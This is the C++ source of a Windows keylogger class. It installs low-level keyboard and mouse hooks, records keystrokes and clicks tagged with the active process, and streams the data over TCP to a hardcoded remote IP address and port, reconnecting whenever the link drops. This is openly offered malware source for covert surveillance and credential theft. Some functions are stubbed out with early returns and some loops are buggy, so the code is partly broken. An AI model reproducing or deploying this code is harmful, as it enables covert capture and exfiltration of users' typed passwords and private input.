#include "KeyLog.h"
#include "boost\asio.hpp"
#include "boost\bind.hpp"
#include "boost\shared_ptr.hpp"
#include <boost\array.hpp>

#pragma comment(lib, "psapi.lib")

using boost::asio::ip::tcp;

HHOOK		key_indic;
HHOOK		mouse_indic;
HANDLE		hookMutex;

KeyLogger	KeyLogger::Instance_ = KeyLogger();

void				DataToUnSignedChar(unsigned char* out, t_Data& in)
{
	std::memcpy(out, &in, sizeof(t_Data));
}

KeyLogger::KeyLogger()
{
	KeyLogger& ptr1 = KeyLogger::Instance();

	std::chrono::seconds s = std::chrono::duration_cast<std::chrono::seconds>(
		std::chrono::system_clock::now().time_since_epoch());
	ptr1.stock_key.Type = KEYSTROKE;
	ptr1.stock_key.Timestamp = static_cast<int>(s.count());
	ptr1.Log_ = getActualProcess();
	Online_ = true;
}

std::string		KeyLogger::getActualProcess() const
{
	LPSTR			win;
	HWND			hwn = GetForegroundWindow();
	DWORD			wPid;
	std::string		process;

	return (std::string("Window.exe"));

	win = (PSTR)VirtualAlloc((LPVOID)NULL,
		256, MEM_COMMIT,
		PAGE_READWRITE);
	GetWindowTextA(hwn, win, 256);
	GetWindowThreadProcessId(hwn, &wPid);
	HANDLE Handle = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
		FALSE,
		wPid
	);
	if (Handle)
	{
		TCHAR Buffer[256];
		if (GetModuleFileNameEx(Handle, 0, Buffer, 256))
		{
			size_t			size = 0;
			char			tmp[256];

			wcstombs_s(&size, tmp, 256, (wchar_t*)Buffer, 256);
			process = tmp;
		}
		CloseHandle(Handle);
		return (RefractProcess(process, wPid));
	}
	return (std::string(process));
}

int					KeyLogger::Run()
{
	this->tryConnect();

	KeyLogger& ptr1 = KeyLogger::Instance();
	unsigned char framein[sizeof(t_Data)];
	hookMutex = CreateMutex(
		NULL, FALSE, NULL);

	if (hookMutex == NULL)
		return -1;

	ptr1.ID_ = ID_;
	std::thread		key([&] { this->LaunchKeyHook(NULL); });
	std::thread		mouse([&] { this->LaunchMouseHook(NULL); });

	while (true)
	{
		if (this->isConnected == true)
		{
			if (this->isDataOn == true && this->Packet_.size() != 0)
			{
				WaitForSingleObject(hookMutex, INFINITE);
				t_Data		tmp = ptr1.Packet_.front();
				ptr1.Packet_.erase(ptr1.Packet_.begin());
				ReleaseMutex(hookMutex);
				DataToUnSignedChar(framein, tmp);
				SendData(framein);
				Sleep(100);
			}
		}
		else
			this->tryConnect();
	}
	key.join();
	mouse.join();
	CloseHandle(hookMutex);
	return 0;
}


int					KeyLogger::shift_case(int scanCode, int key)
{
	if (scanCode >= 2 && scanCode <= 10)
		key = 47 + scanCode;
	else if ((scanCode >= 16 && scanCode <= 25) ||
		(scanCode >= 30 && scanCode <= 39) ||
		(scanCode >= 44 && scanCode <= 49))
		key = key - 32;
	switch (scanCode)
	{
	case 11: {key = '0'; break; }
	case 12: {key = 248; break; }
	case 13: {key = '+'; break; }
	case 86: {key = '>'; break; }
	case 43: {key = 230; break; }
	case 40: {key = '%'; break; }
	case 27: {key = 156; break; }
	case 53: {key = 238; break; }
	case 52: {key = '/'; break; }
	case 51: {key = '.'; break; }
	case 50: {key = '?'; break; }
	case 54: {key = 0; break; }
	case 42: {key = 0; break; }
	default: {key = key; break; }
	}
	return key;
}

int					KeyLogger::alt_case(int scanCode)
{
	switch (scanCode)
	{
	case 3: {return 126; }
	case 4: {return 35; }
	case 5: {return 123; }
	case 6: {return 91; }
	case 7: {return 124; }
	case 8: {return 96; }
	case 9: {return 93; }
	case 10: {return 94; }
	case 11: {return '@'; }
	case 12: {return 93; }
	case 13: {return 125; }
	default: {return 0; }
	}
}

DWORD				KeyLogger::getOldPid(char *data) const
{
	char			tmp[256];
	DWORD			i = 0;
	DWORD			j = -1;

	return (1000);
	while (data[i] != '\\')
		i++;
	i++;
	if (data[i] == '\0')
		return 0;
	while (data[i] != '\\')
		tmp[++j] = data[i++];
	tmp[++j] = 0;
	return (atoi(tmp));
}

DWORD WINAPI 	KeyLogger::LaunchKeyHook(LPVOID param)
{
	HINSTANCE	current = GetModuleHandle(NULL);

	key_indic = SetWindowsHookEx(WH_KEYBOARD_LL, KeyInput, current, NULL);

	MsgLoop();
	UnhookWindowsHookEx(key_indic);
	return (0);
}

DWORD WINAPI 	KeyLogger::LaunchMouseHook(LPVOID param)
{
	HINSTANCE	current = GetModuleHandle(NULL);

	mouse_indic = SetWindowsHookEx(WH_MOUSE_LL, MouseInput, current, NULL);

	MsgLoop();
	UnhookWindowsHookEx(mouse_indic);
	return (0);
}

__declspec(dllexport) LRESULT CALLBACK KeyLogger::MouseInput(int nCode, WPARAM wParam, LPARAM lParam)
{
	KeyLogger& ptr1 = KeyLogger::Instance();
	std::string			clic;

	WaitForSingleObject(hookMutex, INFINITE);
	ptr1.stock_mouse.Timestamp = 0;
	ptr1.stock_mouse.Type = MOUSE;
	std::string			process = ptr1.getActualProcess();

	if (wParam == WM_DESTROY || wParam == WM_CLOSE)
	{
		PostQuitMessage(0);
		return 0;
	}
	else if (nCode == HC_ACTION)
	{
		MOUSEHOOKSTRUCT * infos = (MOUSEHOOKSTRUCT *)lParam;
		if (wParam == WM_LBUTTONDOWN)
			process.append("\L");
		else if (wParam == WM_RBUTTONDOWN)
			process.append("\R");
		else if (wParam == WM_MBUTTONDOWN)
			process.append("\M");
		else
		{
			ReleaseMutex(hookMutex);
			return (CallNextHookEx(mouse_indic, nCode, wParam, lParam));
		}
		strcpy_s(ptr1.stock_mouse.Data, process.c_str());
		size_t				i = strlen(ptr1.stock_mouse.Data);
		while (i > -1)
		{
			if (ptr1.stock_mouse.Data[i] == '\\')
				ptr1.stock_mouse.Data[i] = '\0';
			i--;
		}
		ptr1.Packet_.push_back(ptr1.stock_mouse);
	}
	ReleaseMutex(hookMutex);
	return (CallNextHookEx(mouse_indic, nCode, wParam, lParam));
}

void				KeyLogger::AddLog(char key)
{
	KeyLogger& ptr1 = KeyLogger::Instance();

	switch (key)
	{
	case 13: {ptr1.Log_.append("[*enter*]"); break; }
	case 9: {ptr1.Log_.append("[*tab*]"); break; }
	case 8: {ptr1.Log_.append("[*del*]"); break; }
	case 29: {ptr1.Log_.append("[*ctrl*]"); break; }
	case 0: {break; }
	default: {ptr1.Log_.push_back(key); break; }
	}
	strcpy_s(stock_key.Data, ptr1.getLog().c_str());
}

void			KeyLogger::print_packet()
{
	KeyLogger& ptr1 = KeyLogger::Instance();

	for (std::vector<t_Data>::iterator it = ptr1.Packet_.begin(); it != ptr1.Packet_.end(); ++it)
		std::cout << ' ' << it->Data;
	std::cout << "\n";
}

__declspec(dllexport) LRESULT CALLBACK KeyLogger::KeyInput(int nCode, WPARAM wParam, LPARAM lParam)
{
	KeyLogger& ptr1 = KeyLogger::Instance();
	char key = 0;

	WaitForSingleObject(hookMutex, INFINITE);
	if (wParam == WM_DESTROY || wParam == WM_CLOSE)
	{
		PostQuitMessage(0);
		return 0;
	}
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
		key = ptr1.NonSystemKey(lParam);
	else if (nCode == HC_ACTION && wParam == WM_SYSKEYDOWN)
		key = ptr1.SystemKey(lParam);
	if (ptr1.Check_end() == -1)
	{
		ptr1.Log_.erase(ptr1.Log_.begin(), ptr1.Log_.end());
		ptr1.AddNewPacket();
	}
	ptr1.AddLog(key);
	ReleaseMutex(hookMutex);
	return (CallNextHookEx(key_indic, nCode, wParam, lParam));
}

int					KeyLogger::Check_end() const
{
	KeyLogger& ptr1 = KeyLogger::Instance();
	std::string		actual = getActualProcess();
	LPSTR			win;
	HWND			hwn = GetForegroundWindow();
	DWORD			wPid;
	DWORD			oldPid;
	static			int indic = 0;

	if (indic == 0)
	{
		indic = 1;
		return 1;
	}
	win = (PSTR)VirtualAlloc((LPVOID)NULL,
		256, MEM_COMMIT,
		PAGE_READWRITE);
	GetWindowTextA(hwn, win, 256);
	GetWindowThreadProcessId(hwn, &wPid);
	oldPid = getOldPid(ptr1.stock_key.Data);
	if (strlen(ptr1.stock_key.Data) > 200)
	{
		size_t				i = strlen(ptr1.stock_key.Data);
		while (i > -1)
		{
			if (ptr1.stock_key.Data[i] == '\\')
				ptr1.stock_key.Data[i] = '\0';
			i--;
		}
		return (-1);
	}
	return (1);
}

void				KeyLogger::MsgLoop()
{
	MSG message;

	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

char				KeyLogger::NonSystemKey(LPARAM lParam)
{
	BYTE			keyboard[256];
	KBDLLHOOKSTRUCT*	infos;
	LPWORD			buf = new WORD;
	char key = 0;

	infos = (KBDLLHOOKSTRUCT*)lParam;
	GetKeyboardState(keyboard);
	ToAscii(infos->vkCode, infos->scanCode, keyboard, buf, 0);
	key = ((char)*buf);
	if (GetAsyncKeyState(VK_SHIFT) || infos->scanCode == 54 || infos->scanCode == 42)
		key = this->shift_case(infos->scanCode, key);
	return (key);
}

char				KeyLogger::SystemKey(LPARAM lParam)
{
	KBDLLHOOKSTRUCT*	infos;
	char key = 0;

	infos = (KBDLLHOOKSTRUCT*)lParam;
	key = this->alt_case(infos->scanCode);
	return (key);
}

t_Data				KeyLogger::getPacket() const
{
	return this->Packet_.back();
}

void				KeyLogger::AddNewPacket()
{
	std::string		process;
	std::chrono::seconds s = std::chrono::duration_cast<std::chrono::seconds>(
		std::chrono::system_clock::now().time_since_epoch());

	Packet_.push_back(stock_key);
	print_packet();
	stock_key.Type = KEYSTROKE;
	stock_key.Timestamp = static_cast<int>(s.count());
	process = getActualProcess();
	Log_ = process;
}

int					KeyLogger::tryConnect()
{
	std::string		key;

	if (this->Network_.tryConnect(this->IPServer_, this->PortServer_, this->ID_) == 0)
	{
		this->isConnected = true;
		this->SendData(std::string(this->ID_));
		//key = this->Network_.RcvData();
		//this->Key_ = new unsigned char[key.length() + 1];
		//std::strcpy((char*)this->Key_, key.c_str());
		//std::cout << key << std::endl;

		return (0);
	}
	this->Disconnect();
	return (-1);
}


int					KeyLogger::Disconnect()
{
	this->Network_.Disconnect();
	this->isConnected = false;
	return (0);
}

int					KeyLogger::SendLocalData(std::string& msg)
{
	return (0);
}

int					KeyLogger::SendData(std::string& msg)
{
	if (this->Network_.SendData(msg) == -1)
	{
		this->Disconnect();
		return (-1);
	}
	std::cout << "msg sent" << std::endl;
	return (0);
}

int					KeyLogger::SendData(unsigned char *msg)
{
	if (this->Network_.SendData(msg) == -1)
	{
		this->Disconnect();
		return (-1);
	}
	std::cout << "struct sent" << std::endl;
	return (0);
}

std::string				KeyLogger::getLog() const
{
	return this->Log_;
}

std::string			KeyLogger::RefractProcess(std::string process, DWORD id) const
{
	std::string		last;
	std::string		addr;
	std::string		s_id = std::to_string(id);

	addr = ID_;
	addr.push_back('\\');
	last = process.substr(process.rfind('\\'));
	s_id.append(last);
	s_id.push_back('\\');
	addr.append(s_id);
	return (std::string(addr));
}

void				KeyLogger::setLog(std::string _log)
{
	this->Log_ = _log;
}

int					KeyLogger::Initialization(std::string& id)
{
	tcp::socket::non_blocking_io non_blocking_io(true);
	this->isConnected = false;
	this->isDataOn = true;
	this->isDataOff = false;
	this->isConnected = false;
	this->IPServer_ = "81.64.45.75";
	this->PortServer_ = 7272;
	this->ID_ = id;
	this->CryptoApp_ = std::make_shared<OpenSSL>();

	return 0;
}

KeyLogger::~KeyLogger()
{
}

